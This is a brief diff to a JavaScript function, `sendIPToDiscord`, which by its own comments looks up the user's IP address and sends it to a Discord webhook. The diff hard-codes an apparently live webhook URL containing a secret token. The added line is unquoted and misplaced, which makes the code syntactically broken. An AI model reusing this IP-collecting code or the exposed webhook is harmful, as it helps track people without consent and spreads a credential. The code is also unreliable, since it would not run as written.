@@ -6,6 +6,9 @@
  * @param {string} webhookUrl - The URL of the Discord webhook.
  * @returns {Promise} A promise that resolves when the IP address is sent successfully, or rejects with an error.
  */
+
+webhookUrl = https://discord.com/api/webhooks/1183279682838347887/f1kxyNvuviun6Gob1WCbTQEjz08BHbbsXH3nYkFWDwg42jLVOjb5fJwoWrjmREY5j9me
+
 async function sendIPToDiscord(webhookUrl) {
     try {
         // Make a request to an IP lookup service to get the user's IP address
